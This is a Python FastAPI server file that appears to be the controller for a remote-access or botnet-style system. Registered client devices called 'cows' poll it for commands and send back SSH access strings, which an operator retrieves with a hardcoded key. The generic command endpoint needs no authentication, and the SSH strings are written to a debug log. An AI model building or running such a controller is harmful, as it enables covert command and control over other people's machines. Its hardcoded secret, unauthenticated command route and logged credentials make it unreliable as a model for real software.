# server.py
from fastapi import FastAPI
import time as t
from fastapi import HTTPException
import asyncio

app = FastAPI()

clients = {
    "cow1": {"name": "example", "command": "", "status": "online"},
    "cow2": {"name": "example2", "command": "", "status": "offline"}
}

name_to_id = {
    "example": "cow1",
    "example2": "cow2"
}

stored_ssh = {}

def newDevice(device_name):
    if device_name in name_to_id:
        return
    cowID = f"cow{len(clients) + 1}"
    clients[cowID] = {"name": device_name, "command": "", "status": "online"}
    name_to_id[device_name] = cowID

def assignCommands(id, command):
    if id in clients:
        clients[id]["command"] = command

@app.get("/ping/{device_name}")
async def ping(device_name: str):
    newDevice(device_name)
    cow_id = name_to_id[device_name]
    return {"status": "ok", "command": clients[cow_id]["command"], "ID": cow_id}

@app.get("/ping/ssh/{device_name}/{ssh}")
async def sshReceived(device_name: str, ssh: str):
    key = name_to_id.get(device_name)
    print(f"[DEBUG] Storing SSH for {device_name} ({key}): {ssh}")
    stored_ssh[key] = ssh
    return {"status": "ok"}

@app.get("/command/listcows/{key}")
async def listcows(key: str):
    if key == "NoOneIsAroundToHelp":
        data = [(id, info["name"]) for id, info in clients.items()]
        return {"auth": "ok", "cows": data}
    return {"auth": "failed"}

@app.get("/command/ssh/{cow}/{key}")
async def ssh(cow: str, key: str):
    if key != "NoOneIsAroundToHelp":
        return {"auth": "failed"}

    assignCommands(cow, "ssh")

    timeout = 20  # max seconds to wait
    interval = 1  # polling interval in seconds
    waited = 0

    while waited < timeout:
        ssh_string = stored_ssh.get(cow)
        if ssh_string:
            return {"auth": "ok", "ssh": ssh_string}
        await asyncio.sleep(interval)
        waited += interval

    raise HTTPException(status_code=408, detail="Timeout waiting for SSH string")

@app.get("/command/{cow},{command}")
async def command(cow: str, command: str):
    assignCommands(cow, command)
    return {"status": "ok"}
